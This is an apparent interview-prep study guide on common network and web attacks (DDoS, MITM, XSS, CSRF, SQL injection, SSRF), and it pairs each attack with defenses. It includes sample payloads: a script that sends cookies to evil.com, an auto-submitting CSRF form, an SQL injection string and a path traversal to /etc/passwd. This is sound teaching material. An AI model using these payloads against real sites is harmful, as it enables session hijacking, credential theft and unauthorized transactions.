# 🟠 Common Network & Application Attacks

> **Category:** Security &nbsp;|&nbsp; **Tags:** `DDoS` `MITM` `XSS / CSRF`

---

## Table of Contents
1. [DDoS – Distributed Denial of Service](#ddos--distributed-denial-of-service)
2. [MITM – Man-in-the-Middle](#mitm--man-in-the-middle)
3. [XSS – Cross-Site Scripting](#xss--cross-site-scripting)
4. [CSRF – Cross-Site Request Forgery](#csrf--cross-site-request-forgery)
5. [SQL Injection](#sql-injection)
6. [Other Common Attacks](#other-common-attacks)
7. [Interview Questions](#interview-questions)

---

## DDoS – Distributed Denial of Service

### What it is
An attacker floods a target (server, network, application) with traffic from many compromised machines (**botnet**) to exhaust resources and make the service unavailable to legitimate users.

### Types

| Type | Layer | Method |
|------|-------|--------|
| **Volumetric** | L3/L4 | Flood bandwidth — UDP flood, ICMP flood, amplification attacks |
| **Protocol** | L3/L4 | Exhaust server state — SYN flood, Ping of Death |
| **Application** | L7 | Exhaust server logic — HTTP flood, Slowloris |

### SYN Flood
```
Attacker sends thousands of SYN packets with spoofed IPs
Server allocates state for each (SYN-RECEIVED), waiting for ACK
ACKs never arrive → server's SYN table fills up → legitimate connections refused
```

**Defense:**
- **SYN cookies:** Server doesn't allocate state until the 3-way handshake completes.
- **Rate limiting** on SYN packets.
- **DDoS protection services:** Cloudflare, AWS Shield, Akamai.

### Amplification Attacks (e.g., DNS Amplification)
```
Attacker sends small DNS query with victim's spoofed IP
DNS server sends large response to victim (up to 70x amplification)
Victim flooded with massive traffic at low cost to attacker
```

---

## MITM – Man-in-the-Middle

### What it is
An attacker secretly intercepts and potentially alters communication between two parties who believe they're communicating directly.

```
Client ←──── [Attacker intercepts/modifies] ────→ Server
```

### Common MITM Techniques

| Technique | How |
|-----------|-----|
| **ARP Spoofing** | Attacker broadcasts fake ARP replies, linking their MAC to a legitimate IP |
| **DNS Spoofing** | Inject fake DNS records to redirect traffic |
| **SSL Stripping** | Downgrade HTTPS to HTTP — user connects over HTTP, attacker connects to server over HTTPS |
| **Rogue Wi-Fi AP** | Attacker creates a fake hotspot; users connect through attacker |
| **BGP Hijacking** | Advertise more specific IP prefixes to redirect internet traffic through attacker's network |

### Defenses
- **HTTPS + HSTS:** Prevents SSL stripping.
- **Certificate Pinning:** App rejects unexpected certificates.
- **DNSSEC + DoH/DoT:** Prevents DNS spoofing.
- **VPN:** Encrypted tunnel prevents interception on untrusted networks.

---

## XSS – Cross-Site Scripting

### What it is
An attacker injects malicious scripts into a web page that are then executed in the victim's browser, in the context of the trusted site.

### Types

| Type | How |
|------|-----|
| **Stored (Persistent)** | Malicious script stored in DB, served to all visitors |
| **Reflected** | Script in URL parameter, reflected back in response |
| **DOM-based** | Script manipulates DOM directly via JavaScript, never goes to server |

### Example — Stored XSS
```
Attacker posts comment: <script>document.location='https://evil.com/steal?c='+document.cookie</script>

Victim visits the page → script executes → cookies sent to attacker
```

### Impact
- Steal session cookies (session hijacking)
- Keylogging, form data theft
- Redirect users to phishing sites
- Defacement

### Defenses
- **Output encoding/escaping:** Never render user input as raw HTML.
- **Content Security Policy (CSP):** Whitelist allowed script sources.
- **HttpOnly cookies:** Prevent JavaScript from reading session cookies.
- **`X-XSS-Protection` header** (legacy browsers).
- Use modern frameworks (React, Angular) — auto-escape by default.

---

## CSRF – Cross-Site Request Forgery

### What it is
An attacker tricks a logged-in user into making an unintended request to a site where they're authenticated, using the victim's existing session.

```
1. Victim is logged into bank.com (session cookie stored)
2. Victim visits evil.com (contains hidden form or image tag)
3. evil.com triggers: POST bank.com/transfer?to=attacker&amount=1000
4. Browser automatically sends session cookie → bank processes the request
```

### Example Attack
```html
<!-- On evil.com: -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
<!-- or -->
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker" />
  <input name="amount" value="1000" />
</form>
<script>document.forms[0].submit()</script>
```

### Defenses

| Defense | How |
|---------|-----|
| **CSRF Token** | Server generates a random token per session; form must include it; server validates it |
| **SameSite Cookie** | `SameSite=Strict/Lax` — cookie not sent on cross-site requests |
| **Double Submit Cookie** | Token in cookie + request body must match |
| **Custom request headers** | AJAX requests with `X-Requested-With`; browsers don't send this cross-origin |
| **Origin/Referer check** | Validate `Origin` or `Referer` header on state-changing requests |

---

## SQL Injection

### What it is
Attacker inserts SQL code into an input field that gets executed by the database.

```sql
-- Input: ' OR '1'='1
SELECT * FROM users WHERE username='' OR '1'='1' AND password='...'
-- Returns all users — authentication bypassed
```

### Defenses
- **Parameterized queries / prepared statements** (primary defense).
- **ORMs** (usually safe by default).
- Input validation and whitelisting.
- Least privilege on DB accounts.
- WAF for additional layer.

---

## Other Common Attacks

| Attack | Description | Defense |
|--------|-------------|---------|
| **Path Traversal** | `../../etc/passwd` in file path inputs | Sanitize paths, use allowlists |
| **XXE** | XML input includes external entity references | Disable external entities in XML parser |
| **SSRF** | Server fetches attacker-controlled URL — reaches internal services | Allowlist outbound requests, block metadata IPs |
| **Clickjacking** | Victim clicks invisible iframe over trusted site | `X-Frame-Options: DENY` or CSP `frame-ancestors` |
| **Open Redirect** | `?redirect=https://evil.com` | Validate redirect URLs against allowlist |
| **Brute Force** | Systematic credential guessing | Rate limiting, lockout, MFA, CAPTCHA |

---

## Interview Questions

### Q1. What is the difference between XSS and CSRF?

> **Answer:**
> - **XSS:** Attacker injects a script that runs in the victim's browser **as if it came from the trusted site**. Goal: steal cookies, session tokens, or perform actions as the victim.
> - **CSRF:** Attacker tricks the victim's browser into making a request to a site **where the victim is already logged in**. The browser sends the session cookie automatically — the site can't distinguish it from a legitimate request.
>
> XSS exploits the user's trust in a website. CSRF exploits the website's trust in the user's browser.

---

### Q2. How do CSRF tokens work?

> **Answer:**  
> The server generates a **random, unique, unpredictable token** per session (or per form). It's embedded as a hidden field in every state-changing form and stored server-side. When the form is submitted, the server compares the submitted token with the stored one. Since the attacker cannot read the victim's token (blocked by same-origin policy), forged requests don't include a valid token and are rejected.

---

### Q3. What is a SYN flood attack? How is it mitigated?

> **Answer:**  
> An attacker sends thousands of SYN packets (with spoofed source IPs) to fill up the server's TCP connection queue. The server allocates state for each half-open connection waiting for the final ACK — which never comes. The queue fills up and legitimate connections are rejected.
>
> **Mitigation:** **SYN cookies** — the server encodes connection state in the initial sequence number (ISN) instead of allocating memory. It only allocates state when the ACK arrives and the ISN is verified. This makes the server stateless until the handshake completes.

---

### Q4. What is an amplification attack? Give an example.

> **Answer:**  
> An amplification attack exploits a protocol where a small request produces a large response. The attacker sends the request with the **victim's spoofed IP**, so the large response floods the victim.
>
> **DNS amplification example:**
> - Attacker sends a 40-byte DNS query (`ANY example.com`) with victim's IP.
> - DNS server sends a 4000-byte response to the victim.
> - With 100 DNS servers — 4MB of traffic sent to victim for every 40KB sent by attacker (100× amplification).
>
> **Mitigation:** Response Rate Limiting (RRL) on DNS servers, BCP38 (ingress filtering to block spoofed packets).

---

### Q5. What is SSRF and why is it dangerous in cloud environments?

> **Answer:**  
> **SSRF (Server-Side Request Forgery):** An attacker tricks a server into making HTTP requests to an unintended location — typically internal services or cloud metadata endpoints.
>
> **Dangerous in cloud because:** Cloud providers expose a metadata service at `http://169.254.169.254/` that returns IAM credentials, instance info, and secrets. If an SSRF vulnerability exists, an attacker can steal cloud credentials with full access to the account.
>
> **Mitigation:** Block requests to `169.254.169.254`, use allowlists for outbound destinations, enforce IMDSv2 (requires a session token — not accessible via SSRF).

---

<div align="center">
  <sub>← Back to <a href="networking_interview_topics.md">All Topics</a></sub>
</div>
